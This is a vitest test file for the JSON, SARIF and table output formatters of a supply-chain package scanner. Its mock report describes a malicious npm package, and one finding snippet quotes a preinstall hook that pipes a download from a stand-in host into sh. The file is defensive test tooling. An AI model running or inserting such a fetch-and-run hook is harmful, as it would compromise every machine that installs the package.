import { describe, it, expect } from 'vitest';
import type { ScanReport } from '@wannabe/shared';
import { formatJson, formatSarif, toSarif, formatTable } from '../src/formatters/index.js';

describe('CLI Output Formatters', () => {
  const mockReport: ScanReport = {
    id: 'test-scan-uuid-1234',
    target: {
      packageName: 'malicious-test-pkg',
      version: '1.0.0',
      repoUrl: 'https://github.com/test-org/test-pkg',
      gitTag: 'v1.0.0'
    },
    status: 'completed',
    startedAt: '2026-11-01T00:00:00.000Z',
    completedAt: '2026-11-01T00:00:05.000Z',
    summary: {
      totalFilesSource: 10,
      totalFilesPackage: 12,
      matchedFiles: 8,
      modifiedFiles: 2,
      addedFiles: 2,
      missingFiles: 0,
      expectedArtifacts: 2,
      criticalFlags: 1,
      highFlags: 1,
      mediumFlags: 1,
      lowFlags: 0,
      infoFlags: 0
    },
    fileDiffs: [
      {
        path: 'package.json',
        status: 'modified',
        sizeDiffBytes: 150,
        flags: [
          {
            ruleId: 'WANNABE-R001',
            severity: 'critical',
            category: 'lifecycle_hook',
            message: 'Uncommitted preinstall hook executing external command',
            filePath: 'package.json',
            lineRange: [12, 14],
            snippet: '"preinstall": "curl -s http://malicious.cdn/drop | sh"'
          }
        ]
      },
      {
        path: 'lib/obfuscated.js',
        status: 'added_in_package',
        sizeDiffBytes: 4096,
        flags: [
          {
            ruleId: 'WANNABE-R003',
            severity: 'high',
            category: 'entropy_obfuscation',
            message: 'High Shannon entropy block detected (7.82 bits)',
            filePath: 'lib/obfuscated.js',
            lineRange: [1, 5]
          },
          {
            ruleId: 'WANNABE-R002',
            severity: 'medium',
            category: 'eval_execution',
            message: 'Dynamic code execution via eval()',
            filePath: 'lib/obfuscated.js',
            lineRange: [10, 10]
          }
        ]
      }
    ],
    flags: [
      {
        ruleId: 'WANNABE-R001',
        severity: 'critical',
        category: 'lifecycle_hook',
        message: 'Uncommitted preinstall hook executing external command',
        filePath: 'package.json',
        lineRange: [12, 14],
        snippet: '"preinstall": "curl -s http://malicious.cdn/drop | sh"'
      },
      {
        ruleId: 'WANNABE-R003',
        severity: 'high',
        category: 'entropy_obfuscation',
        message: 'High Shannon entropy block detected (7.82 bits)',
        filePath: 'lib/obfuscated.js',
        lineRange: [1, 5]
      },
      {
        ruleId: 'WANNABE-R002',
        severity: 'medium',
        category: 'eval_execution',
        message: 'Dynamic code execution via eval()',
        filePath: 'lib/obfuscated.js',
        lineRange: [10, 10]
      }
    ],
    aiVerdict: {
      riskScore: 95,
      riskLevel: 'critical',
      summary: 'Critical supply-chain compromise detected via preinstall hook and obfuscated payload.',
      technicalAnalysis: 'The package adds an uncommitted preinstall script and introduces a high-entropy binary file.',
      recommendations: [
        'Do not install this package version in any environment.',
        'File an immediate security disclosure with the npm registry security team.'
      ],
      modelAttribution: 'Google Gemma 4 E4B via Ollama'
    }
  };

  describe('formatJson', () => {
    it('serializes scan report into valid JSON', () => {
      const json = formatJson(mockReport);
      const parsed = JSON.parse(json);
      expect(parsed.id).toBe(mockReport.id);
      expect(parsed.target.packageName).toBe('malicious-test-pkg');
      expect(parsed.flags).toHaveLength(3);
    });
  });

  describe('formatSarif & toSarif', () => {
    it('produces valid OASIS SARIF v2.1.0 output', () => {
      const sarif = toSarif(mockReport);
      expect(sarif.version).toBe('2.1.0');
      expect(sarif.$schema).toContain('sarif-schema-2.1.0.json');

      const run = sarif.runs[0]!;
      expect(run.tool.driver.name).toBe('WANNABE');
      expect(run.tool.driver.rules.length).toBeGreaterThan(0);
      expect(run.results).toHaveLength(3);

      // Verify severity mapping
      const criticalResult = run.results.find((r) => r.ruleId === 'WANNABE-R001');
      expect(criticalResult?.level).toBe('error');
      expect(criticalResult?.locations?.[0]?.physicalLocation.artifactLocation.uri).toBe('package.json');
      expect(criticalResult?.locations?.[0]?.physicalLocation.region?.startLine).toBe(12);

      const mediumResult = run.results.find((r) => r.ruleId === 'WANNABE-R002');
      expect(mediumResult?.level).toBe('warning');
    });

    it('formatSarif returns stringified JSON', () => {
      const sarifStr = formatSarif(mockReport);
      const parsed = JSON.parse(sarifStr);
      expect(parsed.version).toBe('2.1.0');
    });
  });

  describe('formatTable', () => {
    it('renders human-readable ASCII report containing all required sections', () => {
      const table = formatTable(mockReport);
      expect(table).toContain('WANNABE — Software Supply Chain Verification Report');
      expect(table).toContain('malicious-test-pkg@1.0.0');
      expect(table).toContain('FILE COMPARISON MATRIX');
      expect(table).toContain('SECURITY FINDINGS (3)');
      expect(table).toContain('[CRITICAL] WANNABE-R001 (lifecycle_hook)');
      expect(table).toContain('AI VERDICT: [CRITICAL]');
      expect(table).toContain('Risk Score: 95/100');
      expect(table).toContain('Do not install this package version');
    });

    it('renders clean message when no flags are present', () => {
      const cleanReport: ScanReport = {
        ...mockReport,
        flags: [],
        summary: {
          ...mockReport.summary!,
          criticalFlags: 0,
          highFlags: 0,
          mediumFlags: 0
        }
      };
      const table = formatTable(cleanReport);
      expect(table).toContain('No suspicious security flags or anomalies detected.');
    });
  });
});
